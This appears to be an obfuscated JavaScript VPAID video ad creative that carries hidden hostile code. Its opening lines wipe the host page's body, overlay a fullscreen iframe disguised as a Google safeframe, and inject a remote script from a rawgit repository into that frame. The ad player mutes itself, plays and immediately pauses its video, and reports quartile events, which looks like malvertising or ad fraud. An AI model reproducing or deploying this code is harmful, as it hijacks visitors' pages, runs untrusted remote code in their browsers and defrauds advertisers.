var newstr = window['location']['href']['replace']('https://rawgit.com/timonty001/instalp/master/loader15.html?https://rawgit.com/timonty001/instalp/master/dude.js?r=15&ai=', '');
document['getElementsByTagName']('body')[0]['style'] = 'margin:0px;padding:0px;height:100%;width:100%;border:0px;', document['getElementsByTagName']('body')[0]['innerHTML'] = '';
var safeframe = document['createElement']('iframe');
safeframe['id'] = 'yt_safeframe', safeframe['src'] = 'https://tpc.googlesyndication.com/safeframe/1-0-14/html/container.html#ai=' + newstr, safeframe['style'] = 'left:0px;top:0px;border:0px;', safeframe['style']['width'] = '100%', safeframe['style']['height'] = '100%', safeframe['style']['display'] = '100%', safeframe['style']['position'] = 'fixed', safeframe['onload'] = function() {
    var _0x13b9x3, _0x13b9x4 = document['getElementById'](this['id']);
    (_0x13b9x3 = _0x13b9x4['contentDocument'] ? _0x13b9x4['contentDocument'] : _0x13b9x4['contentWindow']['document'])['getElementsByTagName']('body')[0]['innerHTML'] = '', script = document['createElement']('script'), script['type'] = 'text/javascript', script['src'] = 'https://rawgit.com/timonty001/instalp/master/babe.js?a=15&ai=' + newstr, _0x13b9x3['body']['appendChild'](script)
}, document['getElementsByTagName']('body')[0]['appendChild'](safeframe);
var VpaidVideoPlayer = function() {
    this['slot_'] = null, this['videoSlot_'] = null, this['eventsCallbacks_'] = {}, this['attributes_'] = {
        companions: '',
        desiredBitrate: 256,
        duration: 1e4,
        expanded: !1,
        height: 0,
        icons: '',
        linear: !0,
        remainingTime: 1e4,
        skippableState: !1,
        viewMode: 'normal',
        width: 0,
        volume: 0
    }, this['quartileEvents_'] = [{
        event: 'AdVideoStart',
        value: 0
    }, {
        event: 'AdVideoFirstQuartile',
        value: 25
    }, {
        event: 'AdVideoMidpoint',
        value: 50
    }, {
        event: 'AdVideoThirdQuartile',
        value: 75
    }, {
        event: 'AdVideoComplete',
        value: 100
    }], this['nextQuartileIndex_'] = 0, this['parameters_'] = {}
};
VpaidVideoPlayer['prototype']['handshakeVersion'] = function(_0x13b9x3) {
    return '2.0'
}, VpaidVideoPlayer['prototype']['initAd'] = function(_0x13b9x3, _0x13b9x4, _0x13b9x6, _0x13b9x7, _0x13b9x8, _0x13b9x9) {
    this['attributes_']['width'] = _0x13b9x3, this['attributes_']['height'] = _0x13b9x4, this['attributes_']['viewMode'] = _0x13b9x6, this['attributes_']['desiredBitrate'] = _0x13b9x7, this['slot_'] = _0x13b9x9['slot'], this['videoSlot_'] = _0x13b9x9['videoSlot'], this['parameters_'] = JSON['parse'](_0x13b9x8.AdParameters), this['log']('initAd ' + _0x13b9x3 + 'x' + _0x13b9x4 + ' ' + _0x13b9x6 + ' ' + _0x13b9x7), this['updateVideoSlot_'](), this['videoSlot_']['addEventListener']('timeupdate', this['timeUpdateHandler_']['bind'](this), !1), this['videoSlot_']['addEventListener']('loadedmetadata', this['loadedMetadata_']['bind'](this), !1), this['videoSlot_']['addEventListener']('ended', this['stopAd']['bind'](this), !1), this['callEvent_']('AdLoaded')
}, VpaidVideoPlayer['prototype']['loadedMetadata_'] = function() {
    this['attributes_']['duration'] = this['videoSlot_']['duration'], this['callEvent_']('AdDurationChange')
}, VpaidVideoPlayer['prototype']['timeUpdateHandler_'] = function() {
    if (!(this['nextQuartileIndex_'] >= this['quartileEvents_']['length'])) {
        if (100 * this['videoSlot_']['currentTime'] / this['videoSlot_']['duration'] >= this['quartileEvents_'][this['nextQuartileIndex_']]['value']) {
            var _0x13b9x3 = this['quartileEvents_'][this['nextQuartileIndex_']]['event'];
            this['eventsCallbacks_'][_0x13b9x3](), this['nextQuartileIndex_'] += 1
        };
        this['videoSlot_']['duration'] > 0 && (this['attributes_']['remainingTime'] = this['videoSlot_']['duration'] - this['videoSlot_']['currentTime'])
    }
}, VpaidVideoPlayer['prototype']['updateVideoSlot_'] = function() {
    null == this['videoSlot_'] && (this['videoSlot_'] = document['createElement']('video'), this['log']('Warning: No video element passed to ad, creating element.'), this['slot_']['appendChild'](this['videoSlot_'])), this['updateVideoPlayerSize_']();
    this['parameters_']['videos'];
    this['videoSlot_']['setAttribute']('src', 'https://socorder.com/gfhdjskal/2.mp4'), this['callEvent_']('AdStarted')
}, VpaidVideoPlayer['prototype']['updateVideoPlayerSize_'] = function() {
    this['videoSlot_']['setAttribute']('width', this['attributes_']['width']), this['videoSlot_']['setAttribute']('height', this['attributes_']['height'])
}, VpaidVideoPlayer['prototype']['startAd'] = function() {
    this['log']('Starting ad'), this['videoSlot_']['play'](), this['videoSlot_']['pause'](), this['callEvent_']('AdStarted')
}, VpaidVideoPlayer['prototype']['stopAd'] = function() {
    this['log']('Stopping ad');
    this['callEvent_']['bind'](this)
}, VpaidVideoPlayer['prototype']['resizeAd'] = function(_0x13b9x3, _0x13b9x4, _0x13b9x6) {
    this['log']('resizeAd ' + _0x13b9x3 + 'x' + _0x13b9x4 + ' ' + _0x13b9x6), this['attributes_']['width'] = _0x13b9x3, this['attributes_']['height'] = _0x13b9x4, this['attributes_']['viewMode'] = _0x13b9x6, this['updateVideoPlayerSize_'](), this['callEvent_']('AdSizeChange')
}, VpaidVideoPlayer['prototype']['pauseAd'] = function() {
    this['log']('pauseAd'), this['videoSlot_']['pause'](), this['callEvent_']('AdPaused')
}, VpaidVideoPlayer['prototype']['resumeAd'] = function() {
    this['log']('resumeAd'), this['videoSlot_']['play'](), this['callEvent_']('AdPlaying')
}, VpaidVideoPlayer['prototype']['expandAd'] = function() {
    this['log']('expandAd'), this['attributes_']['expanded'] = !0, this['callEvent_']('AdExpanded')
}, VpaidVideoPlayer['prototype']['collapseAd'] = function() {
    this['log']('collapseAd'), this['attributes_']['expanded'] = !1
}, VpaidVideoPlayer['prototype']['skipAd'] = function() {
    this['log']('skipAd'), this['attributes_']['skippableState'] && this['callEvent_']('AdSkipped')
}, VpaidVideoPlayer['prototype']['subscribe'] = function(_0x13b9x3, _0x13b9x4, _0x13b9x6) {
    this['log']('Subscribe ' + _0x13b9x4);
    var _0x13b9x7 = _0x13b9x3['bind'](_0x13b9x6);
    this['eventsCallbacks_'][_0x13b9x4] = _0x13b9x7
}, VpaidVideoPlayer['prototype']['unsubscribe'] = function(_0x13b9x3) {
    this['log']('unsubscribe ' + _0x13b9x3), this['eventsCallbacks_'][_0x13b9x3] = null
}, VpaidVideoPlayer['prototype']['getAdLinear'] = function() {
    return this['attributes_']['linear']
}, VpaidVideoPlayer['prototype']['getAdWidth'] = function() {
    return this['attributes_']['width']
}, VpaidVideoPlayer['prototype']['getAdHeight'] = function() {
    return this['attributes_']['height']
}, VpaidVideoPlayer['prototype']['getAdExpanded'] = function() {
    return this['log']('getAdExpanded'), this['attributes_']['expanded']
}, VpaidVideoPlayer['prototype']['getAdSkippableState'] = function() {
    return this['log']('getAdSkippableState'), this['attributes_']['skippableState']
}, VpaidVideoPlayer['prototype']['getAdRemainingTime'] = function() {
    return this['attributes_']['remainingTime']
}, VpaidVideoPlayer['prototype']['getAdDuration'] = function() {
    return this['attributes_']['duration']
}, VpaidVideoPlayer['prototype']['getAdVolume'] = function() {
    return this['log']('getAdVolume'), this['attributes_']['volume']
}, VpaidVideoPlayer['prototype']['setAdVolume'] = function(_0x13b9x3) {
    this['attributes_']['volume'] = _0x13b9x3, this['log']('setAdVolume ' + _0x13b9x3), this['callEvent_']('AdVolumeChange')
}, VpaidVideoPlayer['prototype']['getAdCompanions'] = function() {
    return this['attributes_']['companions']
}, VpaidVideoPlayer['prototype']['getAdIcons'] = function() {
    return this['attributes_']['icons']
}, VpaidVideoPlayer['prototype']['log'] = function(_0x13b9x3) {}, VpaidVideoPlayer['prototype']['callEvent_'] = function(_0x13b9x3) {
    _0x13b9x3 in this['eventsCallbacks_'] && this['eventsCallbacks_'][_0x13b9x3]()
};
var getVPAIDAd = function() {
    return new VpaidVideoPlayer
}
